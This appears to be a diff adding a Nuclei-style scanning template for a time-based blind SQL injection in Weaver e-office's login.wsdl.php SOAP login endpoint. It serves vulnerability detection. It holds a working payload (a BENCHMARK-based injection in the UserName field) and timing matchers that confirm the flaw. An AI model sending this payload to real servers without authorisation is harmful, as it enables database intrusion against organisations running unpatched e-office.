@@ -1,0 +1,59 @@
+id: Weaver-login-sqli
+
+info:
+  name: 泛微e-office login.wsdl.php 存在sql注入漏洞
+  author: Weaver
+  severity: high
+  tags: Weaver
+
+http:
+  - raw:
+      - |
+        POST /webservice-json/login/login.wsdl.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        SOAPAction: urn:LoginServicewsdl#UserLogin
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <urn:UserLogin soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                 <UserName xsi:type="xsd:string">gero</UserName>
+                 <Password xsi:type="xsd:string">sonoras imperio</Password>
+              </urn:UserLogin>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+      - |
+        POST /webservice-json/login/login.wsdl.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        SOAPAction: urn:LoginServicewsdl#UserLogin
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <urn:UserLogin soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                 <UserName xsi:type="xsd:string">gero' AND 8955=BENCHMARK(4000000,MD5(0x78514279))-- rPQC</UserName>
+                 <Password xsi:type="xsd:string">sonoras imperio</Password>
+              </urn:UserLogin>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_2 >= 4'
+          - 'duration_1 < 2'
+          - 'duration_2 < 10'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - 'UserLoginResponse'
+
